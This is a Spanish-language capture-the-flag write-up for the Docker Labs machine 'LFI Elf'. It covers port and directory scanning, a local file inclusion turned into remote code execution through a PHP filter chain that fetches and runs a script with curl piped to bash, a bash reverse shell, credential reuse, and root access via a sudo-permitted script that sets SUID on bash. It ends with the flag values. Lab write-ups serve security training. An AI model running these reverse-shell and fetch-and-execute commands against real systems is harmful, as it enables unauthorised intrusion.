---
tags:
  - estado/completo
plataforma: "[[docker labs]]"
web: https://www.dockerlabs.com/lfielf
dificultad: Media
os: Linux
linked:
  - "[[Wrappers]]"
  - "[[LFI2RCE]]"
  - "[[alias]]"
  - "[[linpeas]]"
  - "[[Hardening de Sudo]]"
  - "[[Bypass de Restricciones de Filtros]]"
  - "[[Bypass de LFI/RFI]]"
---
#  Docker Labs - LFI Elf

## Reconocimiento
#### 1. Escaneo de Puertos

```bash
nmap -Pn -n -sS -p- --min-rate 5000 -vvv 172.17.0.2 -oN nmap
```
**Resultados**:
- Puerto abierto: `80/tcp` (Apache 2.4.58 en Ubuntu)

#### 2. Enumeración Web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,js,png,jpg -t 100 -b 404
```
**Hallazgos Clave**:
- Archivo crítico: `/secret.txt`  
  ```text
  agent lin,
  I have encrypted this message... 
  prepare something inside the page so you can see the credentials easily.
  ```


---

## Explotación de vulnerabilidades

#### 1. Detección de LFI

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/index.php?FUZZ=/etc/passwd" --hh 978
```
**Parámetro vulnerable**: `search`  
**Lectura de `/etc/passwd`**:
```bash
curl "http://172.17.0.2/index.php?search=/etc/passwd" | grep sh$
```
```text
root:x:0:0:root:/root:/bin/bash
lin:x:1001:1001:lin,,,:/home/lin:/bin/bash
```

#### 2. LFI → RCE con PHP Filter Chain

1. **Descargar script**: [php\_filter\_chain\_generator.py](https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/refs/heads/main/php_filter_chain_generator.py)
   ```bash
   curl -O https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
   chmod +x php_filter_chain_generator.py
   ```

2. **Reverse Shell (evitando límite de longitud)**:
   - **Paso 1**: Crear payload `shell`:
     ```bash
     echo 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1' > shell
     python3 -m http.server 80
     ```
   - **Paso 2**: Generar cadena maliciosa:
     ```bash
     python3 php_filter_chain_generator.py --chain '<?= `curl 172.17.0.1/shell|bash` ?>' | grep php | sed "s|^|http://172.17.0.2/index.php?search=|"
     ```
   - **Paso 3**: Pegar URL en navegador y recibir shell:
     ```bash
     nc -lnvp 443
     ```

>[!note] Detalle
> El atajo PHP: "\<?= \`id\` ?>" está usando el tipo de comillas que se usa para separar código. Son estas ``, no estas ''.


---

## Escalada de privilegios

### Post-Explotación (www-data)
#### 1. Estabilizar Shell

```bash
script /dev/null -c bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

#### 2. Buscar Credenciales

```bash
find / -name "*.txt" 2>/dev/null
```
**Archivos Encontrados**:
- `/var/www/.secret_www-data/.passwd/passwords.txt`:
  ```text
  lin:agentelinsecreto
  ```

#### 3. Escalar a Usuario `lin`

```bash
su lin
Password: agentelinsecreto
```

### Escalada a Root
#### 1. Análisis de Privilegios

- **Problema**: `sudo -l` devuelve error por alias malicioso:
  ```bash
  alias sudo='/usr/local/bin/sudo_wrapper.sh'  # Bloquea sudo -l
  ```
- **Solución**: Usar ruta absoluta:
  ```bash
  /usr/bin/sudo -l
  ```
  **Resultado**:
  ```text
  User lin may run: (ALL) NOPASSWD: /tmp/script.sh
  ```

#### 2. Explotación de Permiso Sudo

1. **Crear script malicioso**:
   ```bash
   echo 'chmod u+s /bin/bash' > /tmp/script.sh
   chmod +x /tmp/script.sh
   ```
2. **Ejecutar como root**:
   ```bash
   sudo /tmp/script.sh
   ```
3. **Verificar SUID en bash**:
   ```bash
   ls -l /bin/bash
   ```
   ```text
   -rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
   ```
4. **Obtener shell de root**:
   ```bash
   /bin/bash -p
   whoami  # root
   ```


---

## Bandera(s)

> [!flag] `flag{user}`
> ed87c5c288f4909dde74cd499acbce92
^bandera-user

> [!flag] `flag{root}`
> 2d264e1f92a8230d442750d69fba4cc5
^bandera-root
